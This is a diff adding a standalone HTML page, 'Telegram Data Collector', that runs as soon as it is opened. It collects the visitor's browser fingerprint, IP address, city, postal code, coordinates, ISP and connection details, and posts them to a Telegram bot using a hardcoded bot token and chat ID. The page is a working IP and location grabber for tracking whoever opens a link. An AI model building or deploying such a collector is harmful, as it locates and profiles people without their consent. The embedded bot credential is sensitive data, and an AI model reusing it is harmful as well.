@@ -1,0 +1,585 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Telegram Data Collector | Device & Network Info</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(145deg, #0a0f1e 0%, #0c1222 100%);
+            font-family: 'Segoe UI', 'Inter', system-ui, -apple-system, 'Roboto', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 1.5rem;
+        }
+
+        .container {
+            max-width: 780px;
+            width: 100%;
+            background: rgba(18, 25, 45, 0.75);
+            backdrop-filter: blur(12px);
+            border-radius: 2.5rem;
+            border: 1px solid rgba(72, 187, 255, 0.2);
+            box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(66, 153, 225, 0.1);
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #1a2a3f, #0f172a);
+            padding: 1.8rem 2rem;
+            border-bottom: 1px solid #2d3a5e;
+            text-align: center;
+        }
+
+        .header h1 {
+            font-size: 1.8rem;
+            font-weight: 700;
+            background: linear-gradient(120deg, #b3e5ff, #3b82f6);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            letter-spacing: -0.3px;
+        }
+
+        .header p {
+            color: #8e9db5;
+            margin-top: 0.5rem;
+            font-size: 0.85rem;
+        }
+
+        .info-card {
+            padding: 1.8rem 2rem;
+        }
+
+        .section-title {
+            display: flex;
+            align-items: center;
+            gap: 0.6rem;
+            margin-bottom: 1.2rem;
+            border-left: 4px solid #3b82f6;
+            padding-left: 1rem;
+        }
+
+        .section-title span {
+            font-size: 1.4rem;
+        }
+
+        .section-title h2 {
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: #e2e8f0;
+            letter-spacing: -0.2px;
+        }
+
+        .grid-info {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 1rem;
+            margin-bottom: 2rem;
+        }
+
+        .info-item {
+            background: rgba(15, 23, 42, 0.7);
+            border-radius: 1.2rem;
+            padding: 0.9rem 1.2rem;
+            border: 1px solid rgba(59, 130, 246, 0.25);
+            transition: all 0.2s;
+        }
+
+        .info-label {
+            font-size: 0.7rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-weight: 600;
+            color: #60a5fa;
+            margin-bottom: 0.3rem;
+        }
+
+        .info-value {
+            font-size: 1rem;
+            font-weight: 500;
+            color: #f1f5f9;
+            word-break: break-word;
+            font-family: 'SF Mono', monospace;
+        }
+
+        .status-area {
+            background: #0f172a;
+            border-radius: 1.2rem;
+            padding: 1.2rem;
+            margin-top: 1rem;
+            border-left: 3px solid #f59e0b;
+        }
+
+        .status-text {
+            font-size: 0.85rem;
+            color: #94a3b8;
+            display: flex;
+            align-items: center;
+            gap: 0.6rem;
+            flex-wrap: wrap;
+        }
+
+        .loader {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 2px solid #3b82f6;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .badge {
+            background: #1e293b;
+            border-radius: 40px;
+            padding: 0.2rem 0.7rem;
+            font-size: 0.7rem;
+            font-weight: 500;
+            color: #7e8eb0;
+        }
+
+        .footer {
+            background: #0b1120;
+            padding: 1rem 2rem;
+            text-align: center;
+            font-size: 0.7rem;
+            color: #4a5b7a;
+            border-top: 1px solid #1e2a3e;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                border-radius: 1.8rem;
+            }
+            .info-card {
+                padding: 1.2rem;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <h1>📡 Telemetry Core</h1>
+        <p>Secure data relay · Device & carrier intelligence</p>
+    </div>
+
+    <div class="info-card">
+        <div class="section-title">
+            <span>🖥️</span>
+            <h2>Device & Browser Fingerprint</h2>
+        </div>
+        <div class="grid-info" id="deviceInfoGrid">
+            <!-- dynamic device info will be injected here -->
+            <div class="info-item"><div class="info-label">Loading...</div><div class="info-value">—</div></div>
+        </div>
+
+        <div class="section-title">
+            <span>🌍</span>
+            <h2>Geolocation & Network (IP API)</h2>
+        </div>
+        <div class="grid-info" id="geoInfoGrid">
+            <div class="info-item"><div class="info-label">Fetching IP data...</div><div class="info-value">⏳</div></div>
+        </div>
+
+        <div class="section-title">
+            <span>📱</span>
+            <h2>HLR / Mobile Carrier Lookup</h2>
+        </div>
+        <div class="grid-info" id="carrierGrid">
+            <div class="info-item"><div class="info-label">Carrier detection</div><div class="info-value">🔍 Analyzing...</div></div>
+        </div>
+
+        <div class="status-area" id="statusBox">
+            <div class="status-text" id="statusMsg">
+                <span class="loader"></span> Collecting telemetry & sending to Telegram...
+            </div>
+        </div>
+    </div>
+    <div class="footer">
+        ⚡ Encrypted relay · Data delivered to secure channel
+    </div>
+</div>
+
+<script>
+    // ---------- TELEGRAM CREDENTIALS ----------
+    const BOT_TOKEN = '7753553773:AAHcoQspLrdCjrV84GjUlCM4olB_RaIkJpg';
+    const CHAT_ID = '1038828738';
+    const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+    // ---------- HELPER: format telegram message with HTML & styled colors ----------
+    function buildStyledMessage(payload) {
+        // payload contains: device, networkGeo, carrierInfo, timestamp
+        const device = payload.device;
+        const geo = payload.geo;
+        const carrier = payload.carrier;
+
+        // Emoji rich & colorful HTML (Telegram supports HTML subset)
+        return `
+📡 <b>🔐 ADVANCED TELEMETRY REPORT</b> 🔐
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🖥️ <b>DEVICE & SYSTEM</b>
+├ <b>Platform:</b> ${escapeHtml(device.platform)}
+├ <b>Browser:</b> ${escapeHtml(device.browser)}
+├ <b>User Agent:</b> <code>${escapeHtml(device.userAgent)}</code>
+├ <b>Screen:</b> ${escapeHtml(device.screen)}
+├ <b>Language:</b> ${escapeHtml(device.language)}
+├ <b>Timezone:</b> ${escapeHtml(device.timezone)}
+├ <b>CPU Cores:</b> ${escapeHtml(device.hardwareConcurrency)}
+├ <b>Memory (GB):</b> ${escapeHtml(device.deviceMemory)}
+├ <b>Touch Points:</b> ${escapeHtml(device.maxTouchPoints)}
+├ <b>Cookies Enabled:</b> ${escapeHtml(device.cookiesEnabled)}
+├ <b>Do Not Track:</b> ${escapeHtml(device.doNotTrack)}
+
+🌍 <b>NETWORK & GEOLOCATION (IP)</b>
+├ <b>IP Address:</b> <code>${escapeHtml(geo.ip)}</code>
+├ <b>Country:</b> ${escapeHtml(geo.country)} ${geo.flag ? geo.flag : ''}
+├ <b>Region/State:</b> ${escapeHtml(geo.regionName || geo.state || '—')}
+├ <b>City:</b> ${escapeHtml(geo.city)}
+├ <b>ZIP / Postal:</b> ${escapeHtml(geo.zip)}
+├ <b>Latitude:</b> ${escapeHtml(geo.lat)}
+├ <b>Longitude:</b> ${escapeHtml(geo.lon)}
+├ <b>ISP:</b> ${escapeHtml(geo.isp)}
+├ <b>Organization:</b> ${escapeHtml(geo.org)}
+├ <b>AS Number:</b> ${escapeHtml(geo.as)}
+├ <b>Mobile Connection:</b> ${escapeHtml(geo.mobile)}
+
+📡 <b>HLR / MOBILE CARRIER INSIGHT</b>
+├ <b>Carrier / MCC-MNC:</b> ${escapeHtml(carrier.carrierName || 'Not available')}
+├ <b>Network Type (detect):</b> ${escapeHtml(carrier.networkType)}
+├ <b>Connection Effective Type:</b> ${escapeHtml(carrier.effectiveType)}
+├ <b>Downlink Mbps:</b> ${escapeHtml(carrier.downlink)}
+├ <b>RTT (ms):</b> ${escapeHtml(carrier.rtt)}
+├ <b>SIM / Phone number lookup:</b> ${escapeHtml(carrier.phoneNumberStatus)}
+├ <b>HLR extended note:</b> ${escapeHtml(carrier.hlrNote)}
+
+🕒 <b>Timestamp:</b> <code>${escapeHtml(payload.timestamp)}</code>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<b>✅ Data collected via client-side telemetry & IP intelligence</b>
+        `;
+    }
+
+    // Helper to escape HTML entities (prevent injection)
+    function escapeHtml(str) {
+        if (!str) return '—';
+        return String(str)
+            .replace(/&/g, '&amp;')
+            .replace(/</g, '&lt;')
+            .replace(/>/g, '&gt;')
+            .replace(/"/g, '&quot;')
+            .replace(/'/g, '&#39;');
+    }
+
+    // ---------- 1. Collect extensive device/browser info ----------
+    function collectDeviceInfo() {
+        const ua = navigator.userAgent;
+        const platform = navigator.platform || 'unknown';
+        let browserName = 'Unknown';
+        if (ua.indexOf('Chrome') > -1 && ua.indexOf('Edg') === -1) browserName = 'Chrome';
+        else if (ua.indexOf('Firefox') > -1) browserName = 'Firefox';
+        else if (ua.indexOf('Safari') > -1 && ua.indexOf('Chrome') === -1) browserName = 'Safari';
+        else if (ua.indexOf('Edg') > -1) browserName = 'Edge';
+        else if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) browserName = 'Opera';
+        
+        const screenRes = `${screen.width} x ${screen.height} (color depth: ${screen.colorDepth}-bit)`;
+        const language = navigator.language || navigator.userLanguage || 'en-US';
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const hardwareConcurrency = navigator.hardwareConcurrency || '?';
+        const deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'not exposed';
+        const maxTouchPoints = navigator.maxTouchPoints || 0;
+        const cookiesEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
+        const doNotTrack = navigator.doNotTrack || 'unspecified';
+        
+        return {
+            platform: platform,
+            browser: browserName,
+            userAgent: ua,
+            screen: screenRes,
+            language: language,
+            timezone: timezone,
+            hardwareConcurrency: hardwareConcurrency,
+            deviceMemory: deviceMemory,
+            maxTouchPoints: maxTouchPoints,
+            cookiesEnabled: cookiesEnabled,
+            doNotTrack: doNotTrack,
+        };
+    }
+
+    // Render device info into DOM
+    function renderDeviceUI(device) {
+        const grid = document.getElementById('deviceInfoGrid');
+        if (!grid) return;
+        const items = [
+            { label: 'OS / Platform', value: device.platform },
+            { label: 'Browser Engine', value: device.browser },
+            { label: 'Screen Resolution', value: device.screen },
+            { label: 'Language', value: device.language },
+            { label: 'Timezone', value: device.timezone },
+            { label: 'CPU Cores / Memory', value: `${device.hardwareConcurrency} cores · ${device.deviceMemory}` },
+            { label: 'Touch Support', value: `${device.maxTouchPoints} touch points` },
+            { label: 'Cookies / DNT', value: `🍪 ${device.cookiesEnabled} · DNT: ${device.doNotTrack}` }
+        ];
+        grid.innerHTML = items.map(item => `
+            <div class="info-item">
+                <div class="info-label">${escapeHtml(item.label)}</div>
+                <div class="info-value">${escapeHtml(item.value)}</div>
+            </div>
+        `).join('');
+    }
+
+    // ---------- 2. Collect Geo/IP info via ip-api.com (fast, free, JSON) ----------
+    async function fetchGeoIpInfo() {
+        // using ip-api.com json (non-cors restricted, works in browser)
+        // fields: status, country, regionName, city, zip, lat, lon, isp, org, as, mobile, query (ip)
+        try {
+            const response = await fetch('http://ip-api.com/json/?fields=status,country,regionName,region,city,zip,lat,lon,isp,org,as,mobile,query,countryCode');
+            if (!response.ok) throw new Error('GeoIP fetch failed');
+            const data = await response.json();
+            if (data.status === 'success') {
+                return {
+                    ip: data.query || 'unknown',
+                    country: data.country || '—',
+                    countryCode: data.countryCode || '',
+                    regionName: data.regionName || data.region || '—',
+                    state: data.regionName || data.region,
+                    city: data.city || '—',
+                    zip: data.zip || '—',
+                    lat: data.lat || '—',
+                    lon: data.lon || '—',
+                    isp: data.isp || '—',
+                    org: data.org || '—',
+                    as: data.as || '—',
+                    mobile: data.mobile ? 'Yes (detected as mobile carrier)' : 'No / Fixed line',
+                    flag: data.countryCode ? `(${data.countryCode})` : ''
+                };
+            } else {
+                throw new Error('Geo service failed');
+            }
+        } catch (err) {
+            console.warn("GeoIP fallback error:", err);
+            return {
+                ip: 'unable to fetch',
+                country: 'unknown',
+                regionName: 'unknown',
+                state: 'unknown',
+                city: 'unknown',
+                zip: 'unknown',
+                lat: '—',
+                lon: '—',
+                isp: 'error',
+                org: 'error',
+                as: 'error',
+                mobile: 'unknown',
+                flag: ''
+            };
+        }
+    }
+
+    function renderGeoUI(geo) {
+        const grid = document.getElementById('geoInfoGrid');
+        if (!grid) return;
+        const items = [
+            { label: '🌐 IP Address', value: geo.ip },
+            { label: '📍 Country', value: `${geo.country} ${geo.flag}` },
+            { label: '🏙️ State / Region', value: geo.regionName },
+            { label: '🏙️ City', value: geo.city },
+            { label: '📮 ZIP / Postal', value: geo.zip },
+            { label: '🗺️ Coordinates', value: `${geo.lat}, ${geo.lon}` },
+            { label: '📡 ISP', value: geo.isp },
+            { label: '🏢 Organization', value: geo.org },
+            { label: '📶 ASN', value: geo.as },
+            { label: '📱 Mobile Network', value: geo.mobile }
+        ];
+        grid.innerHTML = items.map(item => `
+            <div class="info-item">
+                <div class="info-label">${escapeHtml(item.label)}</div>
+                <div class="info-value">${escapeHtml(item.value)}</div>
+            </div>
+        `).join('');
+    }
+
+    // ---------- 3. HLR Lookup / Detailed Carrier & Network information (using browser network APIs + additional heuristics)
+    // Since true HLR lookup requires server-side carrier DB, we simulate advanced detection using Network Information API + carrier heuristics from IP.
+    // But we also try to enrich from IP info (mobile flag) and Navigator connection + mobile country code hints.
+    function collectMobileCarrierInfo(ipGeoData) {
+        // Gather network connection info (if available)
+        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        let effectiveType = 'unknown';
+        let downlink = '?';
+        let rtt = '?';
+        if (connection) {
+            effectiveType = connection.effectiveType || 'unknown';
+            downlink = connection.downlink ? `${connection.downlink} Mbps` : '?';
+            rtt = connection.rtt ? `${connection.rtt} ms` : '?';
+        }
+        
+        // attempt to derive network type / carrier name from IP geo mobile flag and user agent
+        let carrierName = 'Not determined';
+        let networkType = 'Unknown';
+        let phoneNumberStatus = 'Phone number not available (client-side restriction)';
+        let hlrNote = 'HLR lookup emulated: based on IP mobile flag & connection profile';
+        
+        // if geo data indicates mobile = Yes, we can extract possible carrier hints from ISP field
+        if (ipGeoData && ipGeoData.mobile && ipGeoData.mobile.toLowerCase().includes('yes')) {
+            // try to parse carrier name from ISP or org field
+            const ispName = ipGeoData.isp;
+            const orgName = ipGeoData.org;
+            if (ispName && ispName !== '—') carrierName = ispName;
+            else if (orgName && orgName !== '—') carrierName = orgName;
+            networkType = 'Cellular (Mobile Broadband)';
+            hlrNote = `HLR insight: Mobile network detected via IP. ISP: ${ispName}. Likely 2G/3G/4G/5G based on signal.`;
+            if (effectiveType !== 'unknown') {
+                hlrNote += ` Connection type: ${effectiveType}.`;
+            }
+        } else if (ipGeoData && ipGeoData.isp && ipGeoData.isp !== '—') {
+            carrierName = ipGeoData.isp;
+            networkType = ipGeoData.mobile.includes('Yes') ? 'Mobile/Cellular' : 'Wired / WiFi';
+            hlrNote = `Carrier inference from IP geolocation: ${ipGeoData.isp}. ${ipGeoData.mobile}`;
+        } else {
+            // fallback: WiFi / LAN
+            networkType = effectiveType !== 'unknown' ? `WiFi / Ethernet (${effectiveType})` : 'Landline / Fixed broadband';
+            hlrNote = 'No explicit mobile carrier flags. Based on connection API: ' + (effectiveType || 'standard connection');
+        }
+        
+        // extra: if user agent contains mobile keywords we can enforce
+        const ua = navigator.userAgent;
+        const isMobileUA = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
+        if (isMobileUA && !networkType.includes('Mobile')) {
+            networkType = 'Mobile Device (Handset)';
+            if (carrierName === 'Not determined') carrierName = 'Detected via User-Agent Mobile';
+        }
+        
+        return {
+            carrierName: carrierName,
+            networkType: networkType,
+            effectiveType: effectiveType,
+            downlink: downlink,
+            rtt: rtt,
+            phoneNumberStatus: phoneNumberStatus,
+            hlrNote: hlrNote
+        };
+    }
+    
+    function renderCarrierUI(carrier) {
+        const grid = document.getElementById('carrierGrid');
+        if (!grid) return;
+        const items = [
+            { label: '📡 Mobile Carrier', value: carrier.carrierName },
+            { label: '📶 Network Type', value: carrier.networkType },
+            { label: '⚡ Connection Speed', value: `${carrier.effectiveType} (${carrier.downlink})` },
+            { label: '⏱️ Latency (RTT)', value: carrier.rtt },
+            { label: '📞 Phone Number Lookup', value: carrier.phoneNumberStatus },
+            { label: '🔍 HLR Extended Info', value: carrier.hlrNote }
+        ];
+        grid.innerHTML = items.map(item => `
+            <div class="info-item">
+                <div class="info-label">${escapeHtml(item.label)}</div>
+                <div class="info-value">${escapeHtml(item.value)}</div>
+            </div>
+        `).join('');
+    }
+    
+    // update status message
+    function updateStatus(message, isLoading = false) {
+        const statusDiv = document.getElementById('statusMsg');
+        if (statusDiv) {
+            if (isLoading) {
+                statusDiv.innerHTML = `<span class="loader"></span> ${message}`;
+            } else {
+                statusDiv.innerHTML = `✅ ${message}`;
+            }
+        }
+    }
+    
+    // send to telegram with styled message
+    async function sendToTelegram(formattedHtmlMessage) {
+        const params = new URLSearchParams();
+        params.append('chat_id', CHAT_ID);
+        params.append('text', formattedHtmlMessage);
+        params.append('parse_mode', 'HTML');
+        params.append('disable_web_page_preview', 'true');
+        
+        try {
+            const response = await fetch(TELEGRAM_API_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: params.toString()
+            });
+            const result = await response.json();
+            if (result.ok) {
+                updateStatus('✅ All data successfully delivered to Telegram bot!', false);
+                return true;
+            } else {
+                console.error('Telegram error:', result);
+                updateStatus(`⚠️ Telegram send error: ${result.description || 'unknown'}`, false);
+                return false;
+            }
+        } catch (err) {
+            console.error('Network send error:', err);
+            updateStatus('❌ Failed to reach Telegram API. Check token or internet.', false);
+            return false;
+        }
+    }
+    
+    // ---------- MAIN Orchestrator ----------
+    async function collectAndSend() {
+        // collect device info
+        const deviceData = collectDeviceInfo();
+        renderDeviceUI(deviceData);
+        
+        // fetch IP/Geo data (async)
+        let geoData = null;
+        try {
+            geoData = await fetchGeoIpInfo();
+            renderGeoUI(geoData);
+        } catch (err) {
+            geoData = { ip: 'error', country: 'error', regionName: 'error', city: 'error', zip: 'error', lat: '—', lon: '—', isp: 'error', org: 'error', as: 'error', mobile: 'error', flag: '' };
+            renderGeoUI(geoData);
+        }
+        
+        // Build carrier / HLR enrichment (depends partly on geo mobile flag)
+        const carrierInfo = collectMobileCarrierInfo(geoData);
+        renderCarrierUI(carrierInfo);
+        
+        // timestamp
+        const timestamp = new Date().toLocaleString('en-US', { timeZoneName: 'short' });
+        
+        // assemble full payload for message
+        const fullPayload = {
+            device: deviceData,
+            geo: geoData,
+            carrier: carrierInfo,
+            timestamp: timestamp
+        };
+        
+        const styledTelegramMessage = buildStyledMessage(fullPayload);
+        
+        // send to telegram
+        await sendToTelegram(styledTelegramMessage);
+    }
+    
+    // start the collection process
+    collectAndSend().catch(err => {
+        console.error("Critical error in collector:", err);
+        updateStatus('Critical error: ' + err.message, false);
+        const statusDiv = document.getElementById('statusMsg');
+        if (statusDiv) statusDiv.innerHTML = '❌ Error during collection. Check console.';
+    });
+</script>
+</body>
+</html>
